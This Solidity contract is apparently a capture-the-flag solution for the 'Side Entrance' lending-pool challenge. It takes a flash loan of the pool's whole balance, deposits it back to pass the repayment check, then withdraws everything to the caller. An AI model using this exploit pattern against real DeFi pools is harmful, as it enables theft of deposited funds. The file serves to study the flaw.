// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;

    // Entrypoint for attacker
    function attack(SideEntranceLenderPool _pool) external {
        pool = _pool;
        _pool.flashLoan(address(pool).balance);
        _pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    // Called by the flash loaner
    function execute() override external payable {
        pool.deposit{value: msg.value}();
    }

    // Need this so the flash loaner doesn't revert when it tries
    // to send us ether
    receive() external payable {}
}